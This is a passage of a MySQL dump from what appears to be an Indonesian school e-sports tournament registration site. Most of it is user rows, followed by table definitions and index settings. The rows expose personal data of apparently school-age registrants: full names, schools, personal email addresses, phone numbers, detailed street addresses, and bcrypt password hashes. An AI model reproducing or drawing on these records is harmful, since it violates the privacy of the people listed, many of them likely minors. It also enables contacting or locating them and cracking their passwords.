(125, 'Bayu Musnandarulloh', 'NS', 0, 0, 0, 'ns@telscup.com', '-', '0', '2019-10-28 18:00:00', '$2y$10$HNKNiTE9/yeRv3SG3.dPyunwRu0Q9HTImSbo0fWuEBGylkB08kpQC', NULL, '2019-10-29 11:28:20', '2019-10-29 11:28:20'),
(128, 'Reza Eka Putra', 'MID', 0, 0, 0, 'mid@telscup.com', '-', '0', '2019-10-28 18:00:00', '$2y$10$bHjkBoO.KoNJC/A5NWN4nOTVXNqwC46hJuXjVJ4TIYI3hOueFnVau', NULL, '2019-10-29 11:33:40', '2019-10-29 11:33:40'),
(130, 'Kusuma ibnu kemal', 'SMP NEGERI 2 CIBITUNG', 0, 0, 0, 'smp.negeri.2.cibitung@telscup.com', 'SMP NEGERI 2 CIBITUNG', '0', '2019-10-28 18:00:00', '$2y$10$p5DpyWzRDtxLJafTR7JJt.iBInKJf1sbct9Igm.7stDThAXKksLkK', NULL, '2019-10-29 11:35:41', '2019-10-29 11:35:41'),
(131, 'Kusuma ibnu kemal', 'SMP NEGERI 2 CIBITUNG', 0, 0, 0, 'smp.negeri.2.cibitung@telscup.com', 'SMP NEGERI 2 CIBITUNG', '0', '2019-10-28 18:00:00', '$2y$10$u94xwyjL/BUlgjpWLmXlcuJEkkbjFwh1pjWhgTB1k5J7F3NiKDFAC', NULL, '2019-10-29 11:38:14', '2019-10-29 11:38:14'),
(132, 'M Surya Tamam', 'CBT', 0, 0, 0, 'cbt@telscup.com', '-', '0', '2019-10-28 18:00:00', '$2y$10$FJ/n9BBXTPfb4TU/GR.Mk.s/fCpbwDXnD2vhYm2lIyg.cOYQKMmEq', NULL, '2019-10-29 12:29:52', '2019-10-29 12:29:52'),
(133, 'Abdul husen', 'Lunazelmote', 0, 0, 0, 'lunazelmote@telscup.com', '-', '82121436137', '2019-10-28 18:00:00', '$2y$10$29cFXf8dzzObYeu/HhqwQ.WWlTwVqSS3JDh7FG1nqW8Q2QyCuuf/e', NULL, '2019-10-29 12:33:00', '2019-10-29 12:33:00'),
(134, 'M Surya Tamam', 'CBT', 0, 0, 0, 'cbt@telscup.com', '-', '0', '2019-10-28 18:00:00', '$2y$10$FMhRZkw7Q7tuEVPjYLVPzOK5YcIe9BXkaX3EDHyFGAk4JchpwHmCu', NULL, '2019-10-29 12:57:17', '2019-10-29 12:57:17'),
(135, 'M. Rivaldo. S', 'SelArmy', 0, 0, 0, 'selarmy@telscup.com', '-', '0000', '2019-10-28 18:00:00', '$2y$10$cnORzRvnxUWz9IVgrWa6AOKtqT8R7yGIt5cXeSMODdGTbrY3lVNXO', NULL, '2019-10-29 12:58:18', '2019-10-29 12:58:18'),
(136, 'M. Rifki Abdullah', 'Team Duci', 0, 0, 0, 'team.duci@telscup.com', '-', '1283129312', '2019-10-28 18:00:00', '$2y$10$VDRdV0FlqXXpbHScyQig4.JwgYV7HyIiEQ6tmLjBnOH4/gT35kxc6', NULL, '2019-10-29 13:03:56', '2019-10-29 13:03:56'),
(137, 'M. Rayhan', 'Brofist', 0, 0, 0, 'brofist@telscup.com', '-', '085211846979', '2019-10-28 18:00:00', '$2y$10$ZmHy6.eCxbuHlaSdw2jYnOmwBRP0nDaPVaiJrMu4rf4epx5i0.fUa', NULL, '2019-10-29 13:05:41', '2019-10-29 13:05:41'),
(138, 'Wendiasw', 'CALON MANTAN', 0, 0, 0, 'calon.mantan@telscup.com', '-', '089665802507', '2019-10-28 18:00:00', '$2y$10$ABnQu9IXioNg/HGRd6A8juLvkN0mahs3amjtYbztzMuB1FyK6V1N6', NULL, '2019-10-29 13:06:43', '2019-10-29 13:06:43'),
(139, 'Hilmi', 'Jawa E-sport', 0, 0, 0, 'jawa.e-sport@telscup.com', '-', '193123018', '2019-10-28 18:00:00', '$2y$10$cfbseFpRVGv6hYj3.byg/OdTmIVZoI/VJPrO2alO.wts0/1uT2QHy', NULL, '2019-10-29 13:08:16', '2019-10-29 13:08:16'),
(141, 'Bagus Widhi', 'Sekarang mah masih muda', 0, 0, 0, 'sekarang.mah.masih.muda@telscup.com', 'SMPN 11 TAMBUN SELATAN', '0', '2019-10-28 18:00:00', '$2y$10$V429og68F/25Fc3B94sZVupNSs0kp5pcDeWJX7T9C3W8V/dJIntfG', NULL, '2019-10-29 13:31:38', '2019-10-29 13:31:38'),
(142, 'Gloria Tiara Marvel', 'SMP Ananda', 0, 0, 0, 'gloria.tiara01@gmail.com', 'Jl. Prof. M. Yamin.  21', '0881025301412', NULL, '$2y$10$Cdsxhac/O6L.MB.3Ew6jKuIf0YR6KFofwF11dcrq6kfjVLH4b6IA6', NULL, '2019-10-30 01:18:21', '2019-10-30 01:18:21'),
(143, 'Florencia Irena', 'SMP Ananda', 0, 0, 0, 'firena234@gmail.com', 'Jl. Prof. M. Yamin. 21', '083872577199', '2019-10-30 01:22:36', '$2y$10$TOQ9dtzOxKpAMqT4pE787O6qrZKAjzZa0JhNHHY9CdnzwgljuRc5C', NULL, '2019-10-30 01:21:34', '2019-10-30 01:22:36'),
(144, 'Devaro Brahmansyah', 'SMAN 5 Tambun Selatan', 0, 0, 0, 'devaro.tampan1@gmail.com', 'Grand Wisata, Jl. Sunset Boulevard, Lambangsari, Tambun Selatan, RT.002/RW.012, Lambangsari, Kec. Tambun Sel., Bekasi, Jawa Barat 17510', '082187089990', '2019-10-30 10:20:38', '$2y$10$qjs76Rb8u.wv/4YAsoxN2e4ZPbo/KTWBgVAr00CdtX8L4NjFR4LGi', NULL, '2019-10-30 10:20:19', '2019-10-30 10:20:38'),
(145, 'a', 'a', 0, 0, 0, 'a@gmail.com', 'a', '0987666', NULL, '$2y$10$lwM.nStmiVLRTASjKiipROQ9Z2AO7MvvSldTHWQdM/d1Q5Qnu88lS', NULL, '2019-10-30 12:27:34', '2019-10-30 12:27:34'),
(146, 'jonathan eka', 'Sma Ananda / JEKA Entertainment', 0, 0, 0, 'jonathantube02@gmail.com', 'Prof Moh Yamin No.21 Duren Jaya Bekasi Timur, Kota Bekasi, Jawa Barat', '081388494213', '2019-10-31 01:07:53', '$2y$10$CQTAx4JyjqBMni1pPgtTK.wbSCPS29WX5O2G75Rwag4OriNd.9Lwy', NULL, '2019-10-31 01:06:18', '2019-10-31 01:07:53'),
(147, 'Dimas Naufal', 'SMA Negeri 4 Bekasi', 0, 0, 0, 'dimas300303@gmail.com', 'Jl. Cemara Permai, Perum. Harapan Jaya, Bekasi Utara', '081297736447', '2019-10-31 06:26:19', '$2y$10$2zaNkumuEtONWkZwoZI36uNrtl8XbjAwOvI4EszNro09WITyPyu66', NULL, '2019-10-31 06:25:15', '2019-10-31 06:26:19'),
(148, 'Anwar rafi Herawan', 'MI FD', 0, 0, 0, 'anwarrafiherawan@gmail.com', 'Mitra Industri', '081294385365', '2019-11-01 11:25:23', '$2y$10$Aus/3J6lNItPSC/3EPHV8OLVvypQ5Jg/KjISUuight.mKWNJ/6tze', NULL, '2019-11-01 11:25:03', '2019-11-01 11:25:23'),
(149, 'Roy Oswaldha', 'SMA Marsudirini Bekasi', 0, 0, 0, 'ignas.roy@gmail.com', 'Jalan Raya Narogong no 202', '081380240469', '2019-11-02 08:31:50', '$2y$10$Y2Y4iWLX8LKFftVuyNBdYOWrPwQR3gRpJIsMePMze7Rgtz7nWKUWm', NULL, '2019-11-02 08:31:33', '2019-11-02 08:31:50'),
(150, 'Dustin Edward Sipahutar', 'SMA Marsudirini Bekasi', 0, 0, 0, 'woodattwood@gmail.com', 'Jl. Raya Narogong, Jl. Kemang Pratama Raya No.202, RT.002/RW.001, Bojong Rawalumbu, Kec. Rawalumbu, Kota Bks, Jawa Barat 17116', '087804072335', '2019-11-02 08:49:50', '$2y$10$DCZ/Bh6DxuNQ78IygcoRHOTgSix.8jFBtPZcXNwwkoA54qXynnTr6', NULL, '2019-11-02 08:47:26', '2019-11-02 08:49:50'),
(151, 'Muhammad Wildan Al-khautsar', 'SMK Al Munir tambun utara', 0, 0, 0, 'mw1557476@gmail.com', 'Jl. Raya villa bekasi indah 1, jejalen jaya, tambun utara - bekasi', '0895325991104', '2019-11-02 09:43:35', '$2y$10$XVW.7ADgV5mlWIfFzsnjLuipnFEp7EwGPUdA0fA3ygDqZeCpzJrvq', NULL, '2019-11-02 09:41:33', '2019-11-02 09:43:35'),
(152, 'Fadlan Rayhan K', 'Trimsla ID', 0, 0, 0, 'trimsla.id@telscup.com', '-', '081413192792', '2019-11-01 18:00:00', '$2y$10$9J69J8394mmG8tW3dtCje.8fWKzKpEKIJeLty4tKOqMB.SIvl92MW', NULL, '2019-11-02 10:03:05', '2019-11-02 10:03:05'),
(154, 'Anwar Rafi Herawan', 'MI FD', 0, 0, 0, 'mi.fd@telscup.com', '-', '0', '2019-11-01 18:00:00', '$2y$10$XiuMr0eCO/2ay3IzYhCkk.l.HcPSc93/3oCQspzWWxDhIlnc2sBni', NULL, '2019-11-02 15:29:40', '2019-11-02 15:29:40'),
(155, 'Anwar Rafi Herawan', 'MI FD', 0, 0, 0, 'mi.fd@telscup.com', '-', '0', '2019-11-01 18:00:00', '$2y$10$t20oXbdjapI7cOJBz/cmv.En.mZLUQcsuZYLOUJi/z4SrrYXZe9Sm', NULL, '2019-11-02 15:51:55', '2019-11-02 15:51:55'),
(156, 'muhammad salman', 'smk yapin02 setu', 0, 0, 0, 'salxill1435@gmail.com', 'jl.telajung', '0895387199140', '2019-11-03 05:54:16', '$2y$10$oaVMx5TATeZzuH3.7J//Ce.N/llacxF0p6AEzmRGwC4BKUuZSRb66', NULL, '2019-11-03 05:53:47', '2019-11-03 05:54:16'),
(157, 'Fhilivo Syifandra', 'SMA Marsudirini Bekasi', 0, 0, 0, 'fivosyfndra@gmail.com', 'Jl Raya Narogong 202, Bekasi Timur', '087782794997', '2019-11-04 00:36:48', '$2y$10$Rfh0NdrMv8hpcg.FL7bQ.evzro5M5pU9GQOa9HzNv3Prkjx6CNJjK', NULL, '2019-11-04 00:31:56', '2019-11-04 00:36:49'),
(164, 'Refy Rizky Ikman', 'Unravel Shatam', 0, 0, 0, 'unravel.shatam@telscup.com', '-', '0', '2019-11-03 18:00:00', '$2y$10$lTrUWpr76hvN3z.JtjJEC.J98OQUxwVf575WXO250PTQfloV6ynp2', NULL, '2019-11-04 14:10:55', '2019-11-04 14:10:55'),
(165, 'Raihan', 'SMP AL-MUHADJIRIN', 0, 0, 0, 'smp.al-muhadjirin@telscup.com', '-', '6281384594034', '2019-11-05 18:00:00', '$2y$10$o4u.QYdS04ovE3KfjnNnVe0AVfX2CLYCyhhKWyJbn2MEQPM6EfeN2', NULL, '2019-11-06 12:16:17', '2019-11-06 12:16:17'),
(166, 'M Arif Wibowo', 'Slidding brain', 0, 0, 0, 'slidding.brain@telscup.com', '-', '0', '2019-11-05 18:00:00', '$2y$10$ZK7tV1X6NQOfbOZEX2O3i.Mt/ZOVsr1lUFtkQmLJp2Glelty.7jPC', NULL, '2019-11-06 15:16:44', '2019-11-06 15:16:44'),
(167, 'Kemal Afif', 'No Fear', 0, 0, 0, 'no.fear@telscup.com', '-', '081288234043', '2019-11-07 18:00:00', '$2y$10$azVq.XSNmlq7TzwoQtqiF.EDufNyHzg6z55/rHArMrHbUbNobj6Wm', NULL, '2019-11-08 13:48:51', '2019-11-08 13:48:51'),
(168, 'Jonathan', 'GS E-Sport A', 0, 0, 0, 'gs.e-sport.a@telscup.com', '-', '6281382834500', '2019-11-07 18:00:00', '$2y$10$UVDiuThMhWY5wrg5/PW6y.x7g4Sw.2dWJXjH.cLAXeaDMzPAOY/8K', NULL, '2019-11-08 15:27:15', '2019-11-08 15:27:15'),
(169, 'Joko Surahman', 'PINK 03', 0, 0, 0, 'pink.03@telscup.com', '-', '083814182390', '2019-11-07 18:00:00', '$2y$10$NMjHB.Rr3VwWzEm9dLEct.yKadXeEMX/4.u7LldOMHf6LMiwWJwye', NULL, '2019-11-08 15:45:41', '2019-11-08 15:45:41'),
(170, 'Boby', 'SMP IT PERMATA HATI', 0, 0, 0, 'smp.it.permata.hati@telscup.com', '-', '0895332006323', '2019-11-07 18:00:00', '$2y$10$.OITu/ZkVm38kgFz3zateuUL6hPfceMREak6p9ZL4MX6aqUwT1TsK', NULL, '2019-11-08 17:10:37', '2019-11-08 17:10:37'),
(171, 'Iqbal Fahrozi', 'SMK Mitra Industri', 0, 0, 0, 'fahrozii564@gmail.com', 'Cikarang Barat', '081386790562', '2019-11-09 03:15:06', '$2y$10$SDEZBnUVvfo/LjzzAscIx.O/X.QNfAZ0lN1G6z.u0cD4VDfXTG30a', NULL, '2019-11-09 03:13:57', '2019-11-09 03:15:06'),
(172, 'tester', 'tersg', 0, 0, 0, 'tester@gmail.com', 'srklj', '3424', '2019-11-11 18:00:00', '$2y$10$bTQzqNEebH7I697Nid8lLueTpFBM6cyPAYYmw1w.SrhtJNCDcBBLO', NULL, '2019-11-12 14:47:04', '2019-11-12 14:47:04'),
(173, 'Annisa Aulia', 'SMK Yadika 13', 0, 0, 0, 'smk.yadika.13@telscup.com', 'Jl. Raya Villa Indah 1, Kp. Kebun Desa Jejalen Jaya, Rt 01/01, Tambun Utara - Bekasi, 17510', '8', '2019-11-13 18:00:00', '$2y$10$u4zkyX9tD.nJwVKhJM/gVe2/9.WX6U0VcoJileFppzpI4u9oWTssa', NULL, '2019-11-14 06:04:07', '2019-11-14 06:04:07'),
(174, 'Firda Yosefani', 'SMPN 6 Tambun Selatan', 0, 0, 0, 'hennihernawati1970@gmail.com', 'Perum Bumi Sani Permai Ds. Setia Mekar, Tambun Selatan', '081314120519', NULL, '$2y$10$6syCVeUXBZM1.x2sw2wTCe8V3t1VqMrPhFXad1QK8J1IFyQ0MIaIa', NULL, '2019-11-14 08:17:32', '2019-11-14 08:17:32'),
(175, 'Riko', 'SMAN 1ciksel', 0, 0, 0, 'dutaholiganbekasiduta@yahoo.com', 'Sukabumi', '55988366', NULL, '$2y$10$j8bRXwH0JFLr64YGFtCdT.dAXT1/f969umDTfn3h5U8Gw59g59H8S', NULL, '2019-11-29 16:07:53', '2019-11-29 16:07:53'),
(176, 'pogo', 'a team', 0, 0, 0, 'skin.3kn@gmail.com', 'gatau', '00000000000', NULL, '$2y$10$q5NFRL8zRWGQ2h1tXPha..bVFmiCjFkZ03JHlEY/PT86nnXLl0Jyu', NULL, '2020-01-09 18:32:19', '2020-01-09 18:32:19');

-- --------------------------------------------------------

--
-- Struktur dari tabel `view_data`
--

CREATE TABLE `view_data` (
  `id_view` int(11) NOT NULL,
  `content_code` varchar(50) NOT NULL,
  `content_name` text NOT NULL,
  `content_desc` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Indexes for dumped tables
--

--
-- Indeks untuk tabel `bidang_lomba`
--
ALTER TABLE `bidang_lomba`
  ADD PRIMARY KEY (`id_bidang_lomba`);

--
-- Indeks untuk tabel `data_pendaftar`
--
ALTER TABLE `data_pendaftar`
  ADD PRIMARY KEY (`id_data_daftar`);

--
-- Indeks untuk tabel `gallery`
--
ALTER TABLE `gallery`
  ADD PRIMARY KEY (`id_gambar`);

--
-- Indeks untuk tabel `hasil_pertandingan`
--
ALTER TABLE `hasil_pertandingan`
  ADD PRIMARY KEY (`id_hp`);

--
-- Indeks untuk tabel `konfirmasi_payment`
--
ALTER TABLE `konfirmasi_payment`
  ADD PRIMARY KEY (`id_payment`);

--
-- Indeks untuk tabel `live`
--
ALTER TABLE `live`
  ADD PRIMARY KEY (`id_live`);

--
-- Indeks untuk tabel `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `partner`
--
ALTER TABLE `partner`
  ADD PRIMARY KEY (`id_partner`);

--
-- Indeks untuk tabel `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indeks untuk tabel `pendaftaran`
--
ALTER TABLE `pendaftaran`
  ADD PRIMARY KEY (`id_daftar`);

--
-- Indeks untuk tabel `sarkom`
--
ALTER TABLE `sarkom`
  ADD PRIMARY KEY (`id_sarkom`);

--
-- Indeks untuk tabel `stream_bagan`
--
ALTER TABLE `stream_bagan`
  ADD PRIMARY KEY (`id_sb`);

--
-- Indeks untuk tabel `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT untuk tabel yang dibuang
--

--
-- AUTO_INCREMENT untuk tabel `bidang_lomba`
--
ALTER TABLE `bidang_lomba`
  MODIFY `id_bidang_lomba` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT untuk tabel `data_pendaftar`
--
ALTER TABLE `data_pendaftar`
  MODIFY `id_data_daftar` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=179;

--
-- AUTO_INCREMENT untuk tabel `gallery`
--
ALTER TABLE `gallery`
  MODIFY `id_gambar` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `hasil_pertandingan`
--
ALTER TABLE `hasil_pertandingan`
  MODIFY `id_hp` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=53;

--
-- AUTO_INCREMENT untuk tabel `konfirmasi_payment`
--
ALTER TABLE `konfirmasi_payment`
  MODIFY `id_payment` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- AUTO_INCREMENT untuk tabel `live`
--
ALTER TABLE `live`
  MODIFY `id_live` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT untuk tabel `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT untuk tabel `partner`
--
ALTER TABLE `partner`
  MODIFY `id_partner` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT untuk tabel `pendaftaran`
--
ALTER TABLE `pendaftaran`
  MODIFY `id_daftar` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=134;

--
-- AUTO_INCREMENT untuk tabel `sarkom`
--
ALTER TABLE `sarkom`
  MODIFY `id_sarkom` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=68;

--
-- AUTO_INCREMENT untuk tabel `stream_bagan`
--
ALTER TABLE `stream_bagan`
  MODIFY `id_sb` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT untuk tabel `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=177;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
